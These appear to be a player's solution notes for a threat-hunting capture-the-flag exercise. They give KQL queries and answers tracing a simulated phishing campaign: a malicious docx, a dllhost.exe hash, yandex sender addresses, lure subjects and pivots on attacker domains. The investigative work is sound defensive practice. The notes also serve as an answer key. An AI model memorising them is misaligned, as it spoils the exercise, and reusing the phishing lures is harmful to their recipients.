+e3eac25c3beb77ffed609c53b447a81ec8a0e20fb94a6442a51d72ca9e6f7cd2
+
+S3Q16
+
+You saw a suspicious word document on the user's computer a few seconds before that dllhost.exe file appeared. What was the name of that file?
+
+
+we know this
+
+time for dllhost
+
+2323-07-26T12:10:52.000Z
+
+C:\ProgramData\Windows\DllHost\dllhost.exe
+
+
+let t = datetime(2323-07-26T12:10:52);
+FileCreationEvents
+| where username  contains "dahaley"
+| where timestamp between (t - 1m .. t)
+| where path contains "doc"
+
+C:\Users\dahaley\Downloads\Renewable_Energy_Investment.docx
+
+///Renewable_Energy_Investment.docx
+
+S3Q17
+
+What was the Sha256 hash of that docx file?
+
+let t = datetime(2323-07-26T12:10:52);
+FileCreationEvents
+| where username  contains "dahaley"
+| where timestamp between (t - 1m .. t)
+| where path contains "doc"
+
+/// 31beba2309b31bf6523431e5f8859ce33cb889d10e02ad93ce7cb25fa6368ec7
+
+Renewable_Energy_Investment.docx
+
+S3Q18
+
+According to the security vendor Fortinet on virustotal.com, what is the hash of dllhost.exe detected as?
+
+in S3Q15 
+the sha256 of dllhost.exe is e3eac25c3beb77ffed609c53b447a81ec8a0e20fb94a6442a51d72ca9e6f7cd2
+
+search on virustotal.com
+wrong formulation the question is what is the name of the SHA256 given by Fortinet
+
+//response
+
+///Riskware/Frp
+
+
+S3Q19
+
+
+It looks like the employee (Haley) downloaded the .docx file from the internet. What was the full url that she downloaded it from?
+
+from the previous question we know this file Renewable_Energy_Investment.docx jhas bin created
+C:\Users\dahaley\Downloads\Renewable_Energy_Investment.docx
+
+let A=
+Employees
+|where username contains "dahaley"
+| project ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| where url contains "Renewable_Energy_Investment.docx"
+
+
+/// https://renewableenergy.com/public/share/published/Renewable_Energy_Investment.docx
+
+S3Q20
+
+
+What domain name is observed in that url?
+
+let A=
+Employees
+|where username contains "dahaley"
+| project ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| where url contains "Renewable_Energy_Investment.docx"
+
+/// https://renewableenergy.com/public/share/published/Renewable_Energy_Investment.docx
+
+// renewableenergy.com
+
+S3Q21
+
+You don't know why they went on that website to download the suspicious file. You wonder if they might have received the link in an email, and you are correct. When did Haley receive an email with the observed link?
+
+let A=
+Employees
+|where username contains "dahaley"
+| project email_addr;
+Email
+| where recipient has_any (A)
+| where link contains "Renewable_Energy_Investment.docx"
+
+haley received the link  https://renewableenergy.com/public/share/published/Renewable_Energy_Investment.docx
+on 
+//response
+2323-07-26T11:47:24.000Z
+
+
+S3Q22
+
+Who was the sender of the email that Haley received?
+
+let A=
+Employees
+|where username contains "dahaley"
+| project email_addr;
+Email
+| where recipient has_any (A)
+| where link contains "Renewable_Energy_Investment.docx"
+| project sender
+
+///org_competition@yandex.com
+
+
+S3q23
+
+What was the subject of that email?
+
+let A=
+Employees
+|where username contains "dahaley"
+| project email_addr;
+Email
+| where recipient has_any (A)
+| where link contains "Renewable_Energy_Investment.docx"
+| project sender, subject
+
+//[EXTERNAL] FW: Critical: Energy Supply Chain Disruption Alert.
+
+S3Q24
+
+How many people were targeted within that "wave" of emails?
+
+Email
+| where subject contains "[EXTERNAL] FW: Critical: Energy Supply Chain Disruption Alert"
+| distinct recipient
+//17
+
+S3Q25
+
+How many total emails did the actor send with that subject?
+
+Email
+| where subject contains "[EXTERNAL] FW: Critical: Energy Supply Chain Disruption Alert"
+|count //17
+
+S3Q26
+
+You noticed there was a secondary email address in the email. 🧐
+
+What is this email address?
+
+check reply_to
+
+Email
+| where subject contains "[EXTERNAL] FW: Critical: Energy Supply Chain Disruption Alert"
+
+//org@yandex.com
+
+S3Q27
+
+How many unique employees did the threat actors phish using this new sender email address?
+
+Email
+| where reply_to contains "org@yandex.com" or sender contains "org@yandex.com"
+| distinct recipient //115
+
+
+S3Q28
+
+How many unique employees received emails containing domains used in links sent by the previous sender?
+
+pivoting on email
+
+let A=
+Email
+| where reply_to contains "org@yandex.com" or sender contains "org@yandex.com"
+| parse link with "://" domain "/" * 
+| distinct domain;
+Email
+| where link  has_any (A)
+| distinct recipient
+
+//response number of unique employee
+//134
+
+
+
+
+//the domain extracted
+
+solutionspower.org
+renewableenergy.com
+gridsystems.org
+energy-systems.org
+solutions-energy.net
+criticalpower.com
+energy-power.net
+energy-power.com
+powersystems.org
+
+S3Q29
+
+How many distinct subject lines were observed in these emails (from question 28)?
+
+let A=
+Email
+| where reply_to contains "org@yandex.com" or sender contains "org@yandex.com"
+| parse link with "://" domain "/" * 
+| distinct domain;
+Email
+| where link  has_any (A)
+| distinct subject
+
+//9
+
+
+[EXTERNAL] Executive Meeting Rescheduled - Important Update.
+[EXTERNAL] RE: [IMPORTANT] High-Priority Message: Power Grid Security.
+[EXTERNAL] FW: Critical: Energy Supply Chain Disruption Alert.
+[EXTERNAL] Renewable Energy Investment Opportunity.
+[EXTERNAL] RE: Action Required: Security Update for Power Grid.
+[EXTERNAL] [IMPORTANT] High-Priority Message: Power Grid Security.
+[EXTERNAL] RE: Critical: Energy Supply Chain Disruption Alert.
+[EXTERNAL] Action Required: Security Update for Power Grid.
+[EXTERNAL] RE: Confidential: Vulnerability Assessment Results.
+
+S3Q30
+
+What was the least used domain among that batch of emails (from question 28)?
+
+let A=
+Email
+| where reply_to contains "org@yandex.com" or sender contains "org@yandex.com"
+| parse link with "://" domain "/" * 
+| distinct domain;
+Email
+| where link  has_any (A)
+| summarize EmailCount = count() by link
+| order by EmailCount asc
+
+
+https://energy-power.net/published/Urgent_Security_Update.docx	3
+http://renewableenergy.com/share/files/modules/Infrastructure_Vulnerabilities.docx	5
+https://criticalpower.com/images/Emergency_Response_Plan.docx	5
+http://energy-systems.org/search/search/images/online/Energy_Supply_Report.docx	7
+https://gridsystems.org/files/files/modules/Energy_Supply_Report.docx	8
+https://energy-systems.org/modules/Urgent_Security_Update.docx	9
+http://solutions-energy.net/published/files/published/Infrastructure_Vulnerabilities.docx	11
+https://solutionspower.org/online/modules/Emergency_Response_Plan.docx	16
+https://renewableenergy.com/public/share/published/Renewable_Energy_Investment.docx	17
+https://criticalpower.com/public/modules/Urgent_Security_Update.docx	17
+http://energy-power.com/search/share/public/share/Infrastructure_Vulnerabilities.docx	18
+http://powersystems.org/share/share/public/Executive_Meeting_Minutes.docx	18
+
+from the list we have 
+
+///////  energy-power.net
+
+S3Q31
+
+You decide to use an external data source (passive dns) to find more attacker infrastructure.
+
+How many domains shared the same IP(s) as the energy domain you just found?
+
+
+we used the domains from S3Q30 ///  energy-power.net  
+
+pivoting around
+
+
+
+let A=
+PassiveDns
+| where domain  has_any ("energy-power.net")
+| distinct ip;
+PassiveDns
+| where ip has_any (A)
+| distinct domain
+
+//12
+
+gridcritical.net
+gridpower.com
+renewable-critical.com
+solutions-power.net
+gridpower.net
+energy-power.net
+grid-power.net
+solutions-renewable.org
+solutions-critical.com
+renewable-grid.net
+renewableenergy.com
+grid-systems.net
+
+
+let A=
+PassiveDns
+| where domain  has_any ("energy-power.net")
+| distinct ip;
+let B=
+PassiveDns
+| where ip has_any (A)
+| distinct domain;
+Email
+| where sender has_any (B) or reply_to has_any (B) or link has_any (B) or link contains "Renewable_Energy_Investment.docx"
+ or link contains "Urgent_Security_Update.docx"
+ or link contains "Infrastructure_Vulnerabilities.docx"
+ or link contains "Emergency_Response_Plan.docx"
+ or link contains "Energy_Supply_Report.docx"
+ or link contains "Executive_Meeting_Minutes.docx"
+| count
+
+//336
+
+S3Q33
+
+How many of those emails were allowed (not blocked)?
+
+let A=
+PassiveDns
+| where domain  has_any ("energy-power.net")
+| distinct ip;
+let B=
+PassiveDns
+| where ip has_any (A)
+| distinct domain;
+Email
+| where sender has_any (B) or reply_to has_any (B) or link has_any (B) or link contains "Renewable_Energy_Investment.docx"
+ or link contains "Urgent_Security_Update.docx"
+ or link contains "Infrastructure_Vulnerabilities.docx"
+ or link contains "Emergency_Response_Plan.docx"
+ or link contains "Energy_Supply_Report.docx"
+ or link contains "Executive_Meeting_Minutes.docx"
+| where verdict !contains "block"
+
+//305
+
+
+S3Q34
+
+How many times did users download these files?
+
+we know the files
+
+"Renewable_Energy_Investment.docx"
+ "Urgent_Security_Update.docx"
+ "Infrastructure_Vulnerabilities.docx"
+ "Emergency_Response_Plan.docx"
+"Energy_Supply_Report.docx"
+ "Executive_Meeting_Minutes.docx"
+
+
+let file_list = datatable(filename: string)
+[
+"Renewable_Energy_Investment.docx",
+ "Urgent_Security_Update.docx",
+ "Infrastructure_Vulnerabilities.docx",
+ "Emergency_Response_Plan.docx",
+"Energy_Supply_Report.docx",
+ "Executive_Meeting_Minutes.docx" 
+];
+OutboundNetworkEvents
+| where url has_any (file_list)
+///305
